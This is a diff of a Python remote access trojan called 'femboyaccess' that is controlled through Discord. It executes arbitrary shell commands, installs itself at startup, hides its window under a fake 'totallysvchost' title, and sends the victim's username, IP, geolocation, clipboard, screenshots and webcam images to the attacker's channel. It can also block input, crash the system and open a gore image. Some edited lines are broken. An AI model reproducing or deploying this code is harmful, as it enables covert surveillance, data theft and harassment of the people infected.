@@ -1,4 +1,3 @@
-# from modules.fem_imports import *
 import os
 import discord
 import subprocess
@@ -15,16 +14,19 @@ import winreg
 import time
 import inspect
 import comtypes
+import sqlite3
 import win32com.client as wincl
 from pycaw.pycaw import AudioUtilities, IAudioEndpointVolume
 from pynput.keyboard import Key, Controller
 import re
 import datetime 
 from win32api import *
+from discord.ext import commands
 import pyaudio
 import psutil
 import winsound
 import win32gui
+import plistlib
 import win32process
 from win32ui import *
 from win32con import *
@@ -83,7 +85,7 @@ commands_list = [
 	"screenshot - say cheese!",
 	"bsod - self-explanatory",
 	"startup - add femboyaccess to startup",
-	"furryporn - floods the user's screen with furry porn (e621)",
+	"gore - shows a gore photo",
 	"randommousemovements - randomly moves the user's mouse location",
 	"randomvolume - changes the volume value randomly",
 	"getclipboard - fetches the victim's clipboard and sends it",
@@ -203,8 +205,9 @@ async def check_privileges():
 		return "idk"
 
 async def femboyaccess(title, description):
-	full_title = "[2;35mfemboyaccess - " + title + f" _ {version}[0m"
-	full_description = "[2;37m" + description + "[0m"
+	full_title = f"femboyaccess - {title} _ {version}"
+	full_description = description
+
 	message = f"```ansi\n{full_title}\n\n{full_description}```"
 	return message
 
@@ -488,27 +491,34 @@ async def on_ready():
 	else:
 		isvm = "yes"
 
-	await channel.send(f"""```ansi
-[2;35m[0m[2;31mfemboyaccess - new session created! >w<[0m
+	await channel.send  (f"""```ansi
+femboyaccess - new session created! >w<
 
-- [2;34msession[0m: [2;35m{session_id}[0m
-- [2;34musername[0m: [2;35m{os.getlogin()}[0m
-- [2;34mip[0m: [2;35m{country}, {ip}[0m
-- [2;34mis vm: [2;35m{isvm}[0m```""")
-	whnd = ctypes.windll.kernel32.GetConsoleWindow()
-	if stealth == True:
-		if whnd != 0:
-		   try:
-			   ctypes.windll.user32.ShowWindow(whnd, 0)
-			   await channel.send(await femboyaccess("stealth", "python window has been hidden! "))
-		   except:
-			   await channel.send(await femboyaccess("stealth", "could not hide the python window! :c"))
-		try:
-			ctypes.windll.kernel32.SetConsoleTitleW("totallysvchost")
-			await channel.send(await femboyaccess("stealth", "changed process name! "))
-		except:
-			await channel.send(await femboyaccess("stealth", "failed to change process name! :c"))
-		#shutil.move(__file__, os.path.join(new_femboyaccess_dir, os.path.basename(__file__)))
+- session: {session_id}
+- username: {os.getlogin()}
+- ip: {country}, {ip}
+- is vm: {isvm}
+```""")
+import ctypes
+
+async def handle_stealth_mode(channel, stealth, femboyaccess):
+    whnd = ctypes.windll.kernel32.GetConsoleWindow()
+    
+    if stealth:
+        if whnd != 0:
+            try:
+                ctypes.windll.user32.ShowWindow(whnd, 0)
+                await channel.send(await femboyaccess("stealth", "Python window has been hidden!"))
+            except:
+                await channel.send(await femboyaccess("stealth", "Could not hide the Python window! :c"))
+
+        try:
+            ctypes.windll.kernel32.SetConsoleTitleW("totallysvchost")
+            await channel.send(await femboyaccess("stealth", "Changed process name!"))
+        except:
+            await channel.send(await femboyaccess("stealth", "Failed to change process name! :c"))
+
+        # shutil.move(__file__, os.path.join(new_femboyaccess_dir, os.path.basename(__file__)))
 
 @client.event
 async def on_message(message):
@@ -574,19 +584,20 @@ async def on_message(message):
 		if output == "":
 			output = "no output! :c"
 		await message.reply(f"""```ansi
-[2;35mfemboyaccess - shell >w<
+\033[2;35mfemboyaccess - shell >w<
 
-[2;37mshell > {os.getcwd()}
-[0m[2;35m
-[2;37m{output}[0m[2;35m[0m```""")
+\033[2;37mshell > {os.getcwd()}
+\033[0m\033[2;35m
+\033[2;37m{output}\033[0m\033[2;35m\033[0m```""")
+
 
 	if message.content.startswith("run"):
 		file = message.content.split(" ")[1]
 		subprocess.Popen(file, shell=True)
 		await message.reply(f"""```ansi
-[2;35mfemboyaccess - run >w<
+\033[2;35mfemboyaccess - run >w<
 
-[2;37mstarted {file}! :3[0m[2;35m[0m```""")
+\033[2;37mstarted {file}!\033[0m\033[2;35m\033[0m```""")
 
 	if message.content.startswith("exit"):
 		await message.channel.delete()
@@ -594,9 +605,9 @@ async def on_message(message):
 	
 	if message.content.startswith("startup"):
 		await message.reply("""```ansi
-[2;35mfemboyaccess - startup >w<
+\033[2;35mfemboyaccess - startup 
 
-[2;37mfemboyaccess will now launch at startup! :3[0m[2;35m[0m```""")
+\033[2;37mfemboyaccess will now launch at startup!\033[0m\033[2;35m\033[0m```""")
 		await startup()
 		
 	if message.content.startswith("bsod"):
@@ -615,20 +626,21 @@ async def on_message(message):
 		path = os.path.join(os.getenv("TEMP"), "screenshot.png")
 		screenshot.save(path)
 		file = discord.File(path)
-		await message.reply("""```ansi
-[2;35mfemboyaccess - screenshot >w<
-[2;37m
-screenshot taken! see attachment :3[0m[2;35m[0m```""", file=file)
+		await message.reply(
+    """```
+femboyaccess - screenshot 
 
-	if message.content.startswith("furryporn"):
-		num_searches = int(message.content.split(" ")[1])
-		for _ in range(num_searches):
-			post = random.randint(10000, 4087966)
-			webbrowser.get().open(f"https://e621.net/posts/{post}", new=0)
-		await message.reply(f"""```ansi
-[2;35mfemboyaccess - furryporn >w<[0m
+screenshot done, see attached file
+```""", 
+    file=file
+)
+	if message.content.startswith("gore"):
+		webbrowser.get().openwebbrowser.open("https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQK-21zC6B8NKZhIg5dsUGdqPGzChux8GoW_CxVv48nlLJ6wSaD-eXpSNNA_yZ3widfOr8&usqp=CAU", new=0)
+		await message.reply("""```
+					  
+					  gored```""")
 
-[2;37mrandom e621 posts opened {num_searches} times![0m```""")
+
 
 	if message.content.startswith("randommousemovements"):
 		if not random_mouse_running:
@@ -651,7 +663,7 @@ screenshot taken! see attachment :3[0m[2;35m[0m```""", file=file)
 	if message.content.startswith("getclipboard"):
 		output = os.popen("powershell Get-Clipboard").read()
 		if output != "":
-			clipboard = f"clipboard fetched successfully! :3\n\n{output}"
+			clipboard = f"clipboard fetched successfully! \n\n{output}"
 		else:
 			clipboard = "nothing found in clipboard! :c"
 		await message.reply(await femboyaccess("fetch clipboard", clipboard))
@@ -727,7 +739,7 @@ screenshot taken! see attachment :3[0m[2;35m[0m```""", file=file)
 			ctypes.windll.user32.SystemParametersInfoW(20, 0, file_path, 3)
 			await message.reply(await femboyaccess("background", "new background successfully applied! "))
 		else:
-			await message.reply(await femboyaccess("background", "failed to apply new background! :c"))
+			await message.reply(await femboyaccess("background", "failed to apply new background!"))
 
 	if message.content.startswith("playsound"):
 		attachment = message.attachments[0] if message.attachments else None
@@ -750,7 +762,7 @@ screenshot taken! see attachment :3[0m[2;35m[0m```""", file=file)
 		lat = data["latitude"]
 		lon = data["longitude"]
 		org = data["org"]
-		await message.reply(await femboyaccess('doxx', f'user doxxed! :3\n\nip/version: {ip}/{ipver}\ncountry: {country}\nregion: {region}\ncity: {city}\nzip: {postal}\nlatitude/longitude: {lat}/{lon}\nfai: {org}'))
+		await message.reply(await femboyaccess('doxx', f'user doxxed! \n\nip/version: {ip}/{ipver}\ncountry: {country}\nregion: {region}\ncity: {city}\nzip: {postal}\nlatitude/longitude: {lat}/{lon}\nfai: {org}'))
 
 	if message.content.startswith("blockinput"):
 		is_admin = ctypes.windll.shell32.IsUserAnAdmin() != 0
@@ -758,7 +770,7 @@ screenshot taken! see attachment :3[0m[2;35m[0m```""", file=file)
 			donkeyballs = windll.user32.BlockInput(True)
 			await message.reply(await femboyaccess("blockinput", "blocked inputs successfully! "))
 		else:
-			await message.reply(await femboyaccess("blockinput", "admin rights are required for this command, silly "))
+			await message.reply(await femboyaccess("blockinput", "admin rights are required for this command"))
 
 	if message.content.startswith("unblockinput"):
 		is_admin = ctypes.windll.shell32.IsUserAnAdmin() != 0
@@ -766,7 +778,7 @@ screenshot taken! see attachment :3[0m[2;35m[0m```""", file=file)
 			donkeyballs = windll.user32.BlockInput(False)
 			await message.reply(await femboyaccess("unblockinput", "unblocked inputs successfully! "))
 		else:
-			await message.reply(await femboyaccess("unblockinput", "admin rights are required for this command, silly "))
+			await message.reply(await femboyaccess("unblockinput", "admin rights are required for this command"))
 
 	if message.content.startswith("tts"):
 		speak = wincl.Dispatch("SAPI.SpVoice")
@@ -781,8 +793,8 @@ screenshot taken! see attachment :3[0m[2;35m[0m```""", file=file)
 		instruction = full_cmd
 
 		def shell():   
-		   output = subprocess.run(full_cmd, stdout=subprocess.PIPE,shell=True, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
-		   return output
+			output = subprocess.run(full_cmd, stdout=subprocess.PIPE,shell=True, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
+			return output
 
 		result = str(shell().stdout.decode('CP437'))
 		await message.reply(await femboyaccess("windowsphish", "text transmitted! "))
@@ -964,13 +976,13 @@ screenshot taken! see attachment :3[0m[2;35m[0m```""", file=file)
 			set_system_time(int(year), int(month), int(day), int(hour), int(minute))
 			await message.reply(await femboyaccess("timeset", "successfully changed the date! "))
 		else:
-			await message.reply(await femboyaccess("timeset", "admin rights are required for this command, silly "))
+			await message.reply(await femboyaccess("timeset", "admin rights are required for this command "))
 
 	if message.content.startswith("webcampic"):
-		webcam = cv2.VideoCapture(0, CAP_DSHOW)
+		webcam = cv2.VideoCapture(0, cv2.CAP_DSHOW)
 		result, image = webcam.read()
 		imwrite('webcam.png', image)
-		reaction_msg = await message.reply(await femboyaccess("webcampic", "did they say cheese? >w<"), file=discord.File('webcam.png'))
+		reaction_msg = await message.reply(await femboyaccess("webcampic", "lmao"), file=discord.File('webcam.png'))
 		subprocess.run('del webcam.png', shell=True)
 
 	if message.content.startswith("fuckmbr"):
